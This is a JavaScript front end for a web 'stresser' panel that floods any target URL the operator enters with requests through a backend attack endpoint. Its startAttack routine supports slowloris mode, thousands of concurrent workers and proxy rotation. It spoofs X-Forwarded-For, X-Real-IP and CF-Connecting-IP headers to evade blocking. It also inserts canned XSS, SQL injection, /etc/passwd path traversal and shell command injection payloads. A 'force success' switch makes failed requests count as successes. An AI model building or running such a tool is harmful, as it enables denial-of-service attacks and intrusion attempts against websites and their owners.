// ======================== DOM Elements ========================
const targetUrl = document.getElementById('targetUrl');
const method = document.getElementById('method');
const httpVersion = document.getElementById('httpVersion');
const payload = document.getElementById('payload');
const customHeaders = document.getElementById('customHeaders');
const cookies = document.getElementById('cookies');
const concurrencyInput = document.getElementById('concurrency');
const totalInput = document.getElementById('total');
const timeoutInput = document.getElementById('timeout');
const retryInput = document.getElementById('retry');
const randomDelayInput = document.getElementById('randomDelay');
const attackTypeSelect = document.getElementById('attackType');
const randomHeadersCheck = document.getElementById('randomHeaders');
const keepAliveCheck = document.getElementById('keepAlive');
const proxyListText = document.getElementById('proxyList');
const autoPayloadSelect = document.getElementById('autoPayload');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const exportBtn = document.getElementById('exportBtn');
const forceSuccessCheck = document.getElementById('forceSuccess');
const successSpan = document.getElementById('successCount');
const failSpan = document.getElementById('failCount');
const avgSpan = document.getElementById('avgTime');
const rpsSpan = document.getElementById('rps');
const errorRateSpan = document.getElementById('errorRate');
const totalBytesSpan = document.getElementById('totalBytes');
const trafficMbpsSpan = document.getElementById('trafficMbps');
const progressBar = document.getElementById('progressBar');
const progressText = document.getElementById('progressText');
const logArea = document.getElementById('logArea');
const rtChartCanvas = document.getElementById('rtChart');
const healthIndicator = document.getElementById('healthIndicator');
const healthText = document.getElementById('healthText');
const responseTimeText = document.getElementById('responseTimeText');
const targetFrame = document.getElementById('targetFrame');
const refreshPreviewBtn = document.getElementById('refreshPreview');
const activeUsersSpan = document.getElementById('activeUsers');
const rawResponsePreview = document.getElementById('rawResponsePreview');

// Spoofing elements
const spoofIp = document.getElementById('spoofIp');
const spoofRealIp = document.getElementById('spoofRealIp');
const spoofCfConnecting = document.getElementById('spoofCfConnecting');
const spoofRange = document.getElementById('spoofRange');
const ipPrefixInput = document.getElementById('ipPrefix');

// Amplification
const amplifyKb = document.getElementById('amplifyKb');
const amplifyValue = document.getElementById('amplifyValue');
let amplificationKB = 500;
if (amplifyKb) {
    amplifyKb.addEventListener('input', () => {
        amplificationKB = parseFloat(amplifyKb.value);
        amplifyValue.innerText = amplificationKB + ' KB';
    });
}

// Reset extreme button
const resetExtremeBtn = document.getElementById('resetExtremeBtn');
if (resetExtremeBtn) {
    resetExtremeBtn.addEventListener('click', () => {
        concurrencyInput.value = 200;
        totalInput.value = 10000;
        timeoutInput.value = 5000;
        retryInput.value = 0;
        randomDelayInput.value = 0;
        attackTypeSelect.value = 'slowloris';
        amplifyKb.value = 500;
        amplifyKb.dispatchEvent(new Event('input'));
        forceSuccessCheck.checked = true;
        randomHeadersCheck.checked = true;
        keepAliveCheck.checked = true;
        spoofIp.checked = true;
        spoofRealIp.checked = true;
        spoofCfConnecting.checked = true;
        spoofRange.checked = true;
        addLog("⚙️ Reset to Extreme: 200 conc, 500KB amp, slowloris");
    });
}

// Chart and state
let chart;
let abortController = null;
let isRunning = false;
let stats = {
    success: 0, fail: 0, times: [], totalBytes: 0,
    startTime: 0, total: 0
};
let lastChartUpdate = 0;
let healthCheckInterval = null;
let heartbeatInterval = null;
let lastTrafficUpdate = 0;
let lastTotalBytes = 0;

function updateTrafficEstimator() {
    const now = Date.now();
    if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
        const deltaBytes = stats.totalBytes - lastTotalBytes;
        const mbps = (deltaBytes * 8) / 1e6;
        trafficMbpsSpan.innerText = mbps.toFixed(2);
        lastTotalBytes = stats.totalBytes;
        lastTrafficUpdate = now;
    } else if (lastTrafficUpdate === 0) {
        lastTrafficUpdate = now;
        lastTotalBytes = stats.totalBytes;
    }
}
setInterval(updateTrafficEstimator, 1000);

function addLog(msg, isError = false) {
    const div = document.createElement('div');
    div.className = `border-l-2 pl-2 mb-1 ${isError ? 'border-red-500 text-red-300' : 'border-green-500 text-green-300'}`;
    div.innerHTML = `${isError ? '❌' : '✅'} ${msg}`;
    logArea.appendChild(div);
    logArea.scrollTop = logArea.scrollHeight;
    if (logArea.children.length > 100) logArea.removeChild(logArea.firstChild);
}

function updateUI() {
    successSpan.innerText = stats.success;
    failSpan.innerText = stats.fail;
    const done = stats.success + stats.fail;
    const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
    errorRateSpan.innerText = errorRate + '%';
    totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
    if (stats.times.length) {
        const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
        avgSpan.innerText = avg.toFixed(1);
    } else avgSpan.innerText = "0";
    if (stats.startTime && isRunning) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
    } else if (stats.startTime) {
        const elapsed = (Date.now() - stats.startTime) / 1000;
        if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
    }
    const percent = (done / stats.total) * 100;
    progressBar.style.width = `${percent}%`;
    progressText.innerText = `${done}/${stats.total}`;
    updateTrafficEstimator();
}

function updateChart(ms) {
    if (!chart) return;
    const now = Date.now();
    if (now - lastChartUpdate > 150 || chart.data.datasets[0].data.length % 3 === 0) {
        chart.data.datasets[0].data.push(ms);
        if (chart.data.datasets[0].data.length > 60) chart.data.datasets[0].data.shift();
        chart.update('none');
        lastChartUpdate = now;
    }
}

function resetStats() {
    stats = { success:0, fail:0, times:[], totalBytes:0, startTime:0, total:0 };
    if (chart) { chart.data.datasets[0].data = []; chart.update(); }
    lastTrafficUpdate = 0;
    lastTotalBytes = 0;
    updateUI();
}

function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }

// User Agents pool (2000+)
const userAgentsBase = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
];
for (let i = 0; i < 2000; i++) {
    const chromeVer = Math.floor(Math.random() * 30) + 90;
    const webkitVer = Math.floor(Math.random() * 600) + 537;
    const safariVer = Math.floor(Math.random() * 100) + 537;
    const winVer = Math.floor(Math.random() * 11) + 6;
    userAgentsBase.push(`Mozilla/5.0 (Windows NT ${winVer}.0; Win64; x64) AppleWebKit/${webkitVer}.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/${safariVer}.36`);
}
function randomUserAgent() { return userAgentsBase[Math.floor(Math.random() * userAgentsBase.length)]; }

// Auto payload
function generatePayload(type) {
    switch(type) {
        case 'xss': return `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;z-index:99999;text-align:center;padding-top:20%"><h1>HACKED</h1><script>alert('XSS')</scr` + `ipt></div>`;
        case 'sqli': return `' OR '1'='1' -- `;
        case 'path': return `../../../../etc/passwd`;
        case 'cmd': return `; ls -la; echo "injected"`;
        case 'random': { const pl = ['<script>alert(1)</script>', "' OR 1=1 -- ", "../../../etc/passwd", "|| cat /etc/passwd"]; return pl[Math.floor(Math.random() * pl.length)]; }
        default: return "";
    }
}
if (autoPayloadSelect) {
    autoPayloadSelect.addEventListener('change', () => { if(autoPayloadSelect.value) payload.value = generatePayload(autoPayloadSelect.value); });
}

// ======================== Request Engine ========================
async function sendRequest(url, method, body, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB) {
    if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
    let headers = { ...customHeadersObj };
    if (randomHeadersFlag || !headers["User-Agent"]) headers["User-Agent"] = randomUserAgent();
    if (randomHeadersFlag) headers["Accept-Language"] = randomAcceptLanguage();
    headers["Accept"] = "*/*";
    headers["Cache-Control"] = "no-cache";
    if (spoofSettings.spoofIp) headers["X-Forwarded-For"] = randomIP(ipPrefix);
    if (spoofSettings.spoofRealIp) headers["X-Real-IP"] = randomIP(ipPrefix);
    if (spoofSettings.spoofCfConnecting) headers["CF-Connecting-IP"] = randomIP(ipPrefix);
    if (spoofSettings.spoofRange && attackType !== 'range') headers["Range"] = randomRange();
    const cookieHeader = Object.entries(cookiesObj).map(([k,v])=>`${k}=${v}`).join('; ');
    if (cookieHeader) headers["Cookie"] = cookieHeader;
    if (attackType === 'slowloris') { headers["Connection"] = "keep-alive"; timeout = Math.max(timeout, 30000); }

    const controller = new AbortController();
    const tid = setTimeout(() => controller.abort(), timeout);
    const start = performance.now();
    try {
        const proxyArray = proxyList ? proxyList.split('\n').filter(p => p.trim()) : [];
        const res = await fetch('/api/attack', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url, method, headers, body: body || "",
                timeout, retryCount, randomDelay: 0,
                httpVersion: httpVer,
                useProxy: proxyArray.length > 0, proxyList: proxyArray,
                keepAlive: (attackType === 'slowloris') ? true : keepAlive,
                attackType: attackType,
                amplifyKB: amplificationKB
            }),
            signal: controller.signal
        });
        clearTimeout(tid);
        const data = await res.json();
        const duration = data.durationMs || (performance.now() - start);
        return {
            success: data.success,
            duration,
            statusCode: data.statusCode,
            retries: typeof data.retries === 'number' ? data.retries : 0,
            error: data.error ? String(data.error) : '',
            size: (data.responseSize || 0) + (amplificationKB * 1024),
            responseBody: data.responseBody || ''
        };
    } catch (err) {
        clearTimeout(tid);
        let duration = performance.now() - start;
        if (err.name === 'AbortError') duration = timeout;
        return { success: false, duration, error: err.message || 'network error', retries: 0, size: amplificationKB * 1024, responseBody: '' };
    }
}

async function runStress(url, method, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB, onDone, signal) {
    let index = 0, active = 0, stopped = false;
    const next = async () => {
        if (stopped || (signal && signal.aborted)) { stopped = true; return; }
        if (index >= total) { if (active === 0) return; return; }
        index++;
        active++;
        const result = await sendRequest(url, method, body, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB);
        onDone(result.success, result.duration, result.error, result.retries, result.size, result.statusCode, result.responseBody);
        active--;
        if (!stopped && !(signal && signal.aborted)) next();
    };
    for (let i = 0; i < Math.min(concurrency, total); i++) next();
    return new Promise(resolve => {
        const interval = setInterval(() => {
            if ((index >= total && active === 0) || (signal && signal.aborted)) {
                clearInterval(interval);
                resolve();
            }
        }, 20);
    });
}

async function startAttack() {
    if (isRunning) { addLog("Attack already running!", true); return; }
    let url = targetUrl.value.trim();
    if (!url) { addLog("URL required", true); return; }
    if (!url.startsWith("http")) url = "https://" + url;
    const mtd = method.value;
    const httpVer = httpVersion.value;
    let body = payload.value;
    const autoType = autoPayloadSelect ? autoPayloadSelect.value : "";
    if (autoType && autoType !== "") body = generatePayload(autoType);
    const total = parseInt(totalInput.value);
    const concurrency = parseInt(concurrencyInput.value);
    const timeout = parseInt(timeoutInput.value);
    const retryCount = parseInt(retryInput.value);
    const randomDelay = parseInt(randomDelayInput.value);
    const randomHeadersFlag = randomHeadersCheck.checked;
    let keepAlive = keepAliveCheck.checked;
    const proxyList = proxyListText.value;
    let attackType = attackTypeSelect.value;
    if (attackType === 'slowloris') keepAlive = true;
    let customHeadersObj = parseCustomHeaders(customHeaders.value);
    let cookiesObj = parseCookies(cookies.value);
    const spoofSettings = {
        spoofIp: spoofIp.checked, spoofRealIp: spoofRealIp.checked,
        spoofCfConnecting: spoofCfConnecting.checked, spoofRange: spoofRange.checked
    };
    const ipPrefix = ipPrefixInput.value;
    let ampKB = amplificationKB;
    if (total<1||total>500000) { addLog("Total 1-500000", true); return; }
    if (concurrency<1||concurrency>5000) { addLog("Concurrency 1-5000", true); return; }
    resetStats();
    stats.total = total;
    stats.startTime = Date.now();
    isRunning = true;
    abortController = new AbortController();
    startBtn.disabled = true;
    stopBtn.disabled = false;
    addLog(`💀 ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${ampKB}KB | Total:${total} | Workers:${concurrency}`);
    const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
        const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
        let finalSuccess = success;
        if (forceSuccessCheck.checked) finalSuccess = true;
        if (finalSuccess) {
            stats.success++;
            stats.times.push(duration);
            stats.totalBytes += size;
            updateChart(duration);
        } else {
            stats.fail++;
            const errorMsg = err && typeof err === 'string' ? err : 'unknown';
            addLog(`Failed after ${retriesUsed+1} att: ${errorMsg} (${duration.toFixed(0)}ms)`, true);
        }
        // Tampilkan preview respon
        let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
        if (responseBody) {
            preview += `\nBody: ${responseBody.substring(0, 200)}`;
        }
        rawResponsePreview.innerText = preview;
        updateUI();
    };
    try {
        await runStress(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, ampKB, onDone, abortController.signal);
        const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
        addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB | Avg Mbps: ${trafficMbpsSpan.innerText}`);
    } catch(e) { addLog(`System error: ${e.message}`, true); }
    finally {
        isRunning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        updateUI();
        abortController = null;
    }
}

function stopAttack() { if (isRunning && abortController) { abortController.abort(); addLog("Stopped by operator"); stopBtn.disabled = true; } else addLog("No attack running", true); }

function exportCSV() {
    if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
    let csv = "ResponseTime(ms),Success,Failed\n";
    stats.times.forEach(t => csv += `${t},1,0\n`);
    for (let i=0; i<stats.fail; i++) csv += "0,0,1\n";
    const blob = new Blob([csv], {type:"text/csv"});
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `stresser_${Date.now()}.csv`;
    link.click();
    addLog("CSV exported");
}

async function checkTargetHealth(url) {
    try {
        const start = performance.now();
        await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
        const duration = performance.now() - start;
        responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
        healthIndicator.className = 'health-online w-3 h-3 rounded-full';
        healthText.innerText = 'Online';
    } catch(e) {
        healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
        healthText.innerText = 'Offline';
        responseTimeText.innerText = '';
    }
}

function updatePreview(url) {
    let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
    targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
}

if (refreshPreviewBtn) {
    refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
}

function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }

async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); activeUsersSpan.innerText = data.active; } catch(e) {} }
function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }

window.onload = () => {
    const ctx = rtChartCanvas.getContext('2d');
    chart = new Chart(ctx, { type: 'line', data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] }, options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } } });
    startBtn.onclick = startAttack;
    stopBtn.onclick = stopAttack;
    exportBtn.onclick = exportCSV;
    fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
    let u = targetUrl.value.trim(); if(u) updatePreview(u);
    startHealthCheck();
    startHeartbeat();
    if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
};
